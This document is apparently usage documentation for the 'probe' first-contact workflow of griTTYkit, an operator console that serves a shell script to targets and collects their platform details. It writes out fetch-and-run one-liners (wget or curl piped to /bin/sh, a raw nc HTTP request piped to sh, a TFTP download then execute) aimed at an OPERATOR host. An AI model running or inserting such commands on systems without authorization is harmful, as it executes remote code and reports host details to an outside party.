# Probe Bootstrap

The first-contact bootstrap workflow is now exposed as the `probe` transport:

```sh
scripts/grit-console \
  --transport probe \
  --listen-host 0.0.0.0 \
  --probe-port 22207 \
  --probe-name probe.sh
```

The HTTP probe listener is `probe-http` in the interactive console listener
table and delivery view. Headless commands still use `--transport probe`. A
separate TFTP fallback listener can serve the same script over UDP:

```sh
scripts/grit-console \
  --transport probe-tftp \
  --listen-host 0.0.0.0 \
  --probe-tftp-port 22208 \
  --probe-name probe.sh
```

`scripts/grit-console --transport probe` serves a small architecture-agnostic
`/bin/sh` script and accepts the script's result upload. This is intended for
first contact when the operator does not yet know which griTTYkit artifact to
send to the target.

The server prints a URL such as:

```text
Probe listener. Listening on http://127.0.0.1:22207/probe.sh
```

On the target, download and run it with whatever basic tool is available:

```sh
wget -O- http://OPERATOR:22207/probe.sh | /bin/sh
curl -fsSL http://OPERATOR:22207/probe.sh | /bin/sh
printf 'GET /probe.sh HTTP/1.0\r\nHost: OPERATOR\r\n\r\n' | nc OPERATOR 22207 | sed '1,/^\r*$/d' | /bin/sh
tftp -g -r probe.sh -l /tmp/probe.sh OPERATOR 22208 && /bin/sh /tmp/probe.sh
```

The line-oriented console wraps the same workflow:

```text
grit[all]> probe --start
grit[all]> probe delivery
grit[all]> probe results
grit[all]> listener probe config
grit[all]> profile
grit[all]> listener serve start
```

`probe delivery` shows target-side `wget`, `curl`, raw `nc` HTTP GET, and TFTP
commands for the current probe route. The current listener families are
`probe-http` and `probe-tftp`; future listener names are reserved for
`probe-ftp` and `probe-dns` so the console can grow into separate first-contact
delivery services without changing the probe result workflow.

`listener probe config` populates the active target/deployment profile under
the operator session. `listener serve start` then stages the matching release
artifact from that active profile and prints target fetch options. On a target
that does not have griTTYkit yet, use the printed plain `wget` or `curl`
command against `/fetch?name=...`; if the file service is configured without
TLS, the console also prints a raw HTTP `nc` fallback. Then run the printed
`chmod +x ./grit... && ./grit... --help` hint. On a target that already has
griTTYkit, use the printed `grit fetch ...` command instead.

If `listener serve` says no release is configured, it prints the detected
architecture/kernel tuple shape and common payload presets it expected. You do
not need to restart the console after extracting a release bundle; point the
current session at it and rerun the serve command:

```text
grit[all]> set release_dir /path/to/extracted-release
grit[all]> listener serve start
```

`listener probe config write-config FILE` remains available when you explicitly
need to export a build/artifact config from the newest probe result. The probe
only captures basic platform evidence, so a later full `grit survey retrieve` can
refine the recommendation after a payload is deployed.

When a bridge profile is selected, generated target commands use the bridge's
target-visible route instead of the direct probe listener:

```sh
scripts/grit-console \
  --transport probe \
  --probe-port 22207 \
  --bridge-profile rack-chain
```

Status JSON exposes `probe_workflow_actions`, a stable action catalog for the
current probe route. Records cover inspecting the route, showing the target-side
command, starting the listener, and stopping it. Each record includes the
equivalent `headless_command`, generated `target_command`, direct or bridged
route metadata, current service state, operator readiness fields, a stable
`run_command`, and Enter-key hints for line-console/API clients.

Operators can run the same records headlessly with
`--run-probe-workflow-action ACTION_OR_NUMBER`; dry runs use
`--probe-workflow-dry-run`, and listener stop requires
`--confirm-probe-workflow-action`.

The script collects `uname -s`, `uname -m`, `uname -r`, word size from
`getconf LONG_BIT` when available, and a simple endian probe using `od` and
`awk` when available. It posts those values back with `wget --post-data` or
`curl -d`.

Operator-side records:

- Results are appended to probe result state under the configured operator
  session directory.
- `--status`, `--json-status`, and `--api-status` include the `probe` service.
- Events include probe request/result/error records and workbench probe action
  events.

The probe script is not a griTTYkit binary and does not assume a target
architecture. It only requires `/bin/sh`; result upload uses `wget`, `curl`, or
raw `nc` when available.
